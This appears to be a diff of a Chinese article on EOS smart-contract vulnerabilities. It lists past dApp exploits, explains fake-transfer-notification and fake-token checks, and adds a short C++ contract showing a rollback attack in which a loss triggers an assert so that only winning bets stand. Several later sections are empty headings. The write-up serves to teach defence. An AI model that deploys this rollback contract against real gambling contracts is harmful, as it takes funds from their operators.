@@ -22,9 +22,9 @@
 |10.28|EOS POKER|游戏方在拓展服务器时忘记将种子放入数据库中，因此有玩家利用获胜的种子赢取奖池|1374|
 |10.31|EOSCast|游戏合约在 apply 里没有校验 transfer action的调用方必须是 eosio.token 或者是自己的游戏代币合约|70000|
 |11.04|EOSDICE|随机数被攻破|2545|
-|11.04|EOSeven|内部成员进行大额转账，抛售SVN|
 
-这些漏洞大部分是由于程序员的疏忽或者对eos合约的原理不熟悉导致的，归纳起来可以分为几类：数据溢出，RAM被合约吞噬，假币，假转账通知，失败回滚，随机数破击，。RAM被合约吞噬，是项目方故意为之，不属于漏洞。这里之所以列出来主要是为了让更多人了解EOS的内存消耗机智。
+
+这些漏洞大部分是由于程序员的疏忽或者对eos合约的原理不熟悉导致的，归纳起来可以分为几类：数据溢出，RAM被合约吞噬，假币，假转账通知，失败回滚，拒绝转账，随机数破击。RAM被合约吞噬，是项目方故意为之，不属于漏洞。这里之所以列出来主要是为了让更多人了解EOS的内存消耗机制。
 
 ####  数据溢出
 
@@ -125,7 +125,7 @@ void token::transfer( account_name from,
 ```
 
 一般去中心化交易所或者菠菜游戏的合约代码大概是这么写的，在on _transfer中处理转账通知。代码中的两处注释就是防止假转账通知和假币。
-若没有注释1中的判断，黑客可以写一个合约，用他的另外一个账号给他的合约转账，在他的合约里面调require_recipient通知我们的合约。我们的合约就以为给我们转账，实际上他的to并不是我们的合约。
+若没有注释1中的判断，黑客可以写一个合约，用他的另外一个账号给他的合约转账，在他的合约里面调require_recipient通知我们的合约。我们的合约以为给我们转账，实际上他的to并不是我们的合约。
 
 ```
 class game : public contract {
@@ -145,7 +145,7 @@ public:
             return;
         }
 
-        //2. 判断是否是假币
+        //2. 判断是否是假币
         if (code != N(eosio.token) && t.quantity.symbol == S(4, EOS))
         {
            return;
@@ -181,5 +181,45 @@ extern "C" {
 ```
 
 ### 失败回滚
+早期有一些骰子游戏逻辑是这样的，合约收到玩家的下注后，立即在合约内部根据区块随机数据还有时间戳等一些信息作为种子，生成随机数，判断输赢，若赢则立即给玩家转账。这种设计主要是因为初学者对eos合约的运行原理不熟悉导致的。eos一个transaction可以包含多个action，只要其中一个action运行失败，整个transaction都会失败，可以类比数据库的事务。黑客可以利用这个原理，实现这样一个攻击合约。代码如下：
+
+```
+class mycontract : public eosio::contract
+{
+public:
+
+  void attack() {
+    //1: 读自己账号的余额
+    uint64_t old_balance = getBalance();
+
+    //2,这里调用游戏合约下注
+    bet();
+
+    //3,触发attackafter
+    SEND_INLINE_ACTION(*this, attackafter, {_self, N(active)}, {old_balance});
+  }
+
+  void attackafter(uint64_t old_balance){
+      if (old_balance > getBalance()) {
+           //输了，终止action，回滚之前的操作
+           eosio_assert(0,  "lose");
+      }
+  }
+};
+```
+黑客写了两个action，第一个先读自己合约账号的余额，在去调用游戏合约下注，最后触发一个action，也就是上面的attackafter，再读一次余额。如果余额减少那肯定是输了，这时只要终止这个action，前面的action也都会失败，相当于没有下注，黑客的eos并有损失。只有赢的时候，整个trasaction才会执行。黑客用这个合约下注就可以做到只赢不输。
+
+### 重放攻击
+
+
+### 拒绝收款
+
+
+### 随机数攻破
+
+
+### 合约都是开源的
+
+
 
 
